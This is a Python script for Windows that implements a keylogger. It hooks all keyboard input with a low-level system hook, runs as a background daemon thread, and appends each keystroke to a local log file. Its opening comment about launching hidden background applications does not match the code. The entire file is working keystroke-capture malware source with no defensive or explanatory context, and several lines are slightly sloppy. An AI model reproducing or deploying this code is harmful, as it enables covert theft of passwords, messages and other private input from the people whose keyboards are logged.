# Launch win32 application in the backround and supress window creation
# imports for win32 api
import win32api
import win32con
import os
import ctypes.wintypes
from ctypes import *
import threading
import win32con, win32api

ctypes.windll.user32.SetWindowsHookExW.argtypes = (c_int, c_void_p, c_void_p, c_uint)

class keylogger(threading.Thread):
    #Stolen from http://earnestwish.com/2015/06/09/python-keyboard-hooking/                                                          
    exit = False

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.hooked  = None
        self.keys = ''
        self.start()
    
    def log(self, log_string):
        current_path = os.path.dirname(os.path.abspath(__file__))
        with open(current_path + '\\' + 'log.txt', 'a') as f:
            f.write(log_string + '\n')
            f.close()

    def installHookProc(self, pointer):
        self.hooked = windll.user32.SetWindowsHookExW(win32con.WH_KEYBOARD_LL, pointer,
                                             win32api.GetModuleHandle(None), 0)
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def getFPTR(self, fn):
        self.log("getFPTR")                                                                  
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        return CMPFUNC(fn)

    def hookProc(self, nCode, wParam, lParam):
        if wParam is not win32con.WM_KEYDOWN:
            return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
        #self.keys += chr(int(lParam[0]) & 0xFFFFFFFF)
        self.log(chr(int(lParam[0]) & 0xFFFFFFFF))
        # if len(self.keys) > 100:
        #     self.log(''.join(self.keys))
        return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)     

    def startKeyLog(self):
        msg = ctypes.wintypes.MSG()
        ctypes.windll.user32.GetMessageA(ctypes.byref(msg),0,0,0)

    def run(self):                                 
        pointer = self.getFPTR(self.hookProc)
        if self.installHookProc(pointer):
            self.startKeyLog()

# main
if __name__ == '__main__':
    keylogger.exit = False
    keylogger(123)
    input('Press enter to stop keylogger')
    keylogger.exit = True
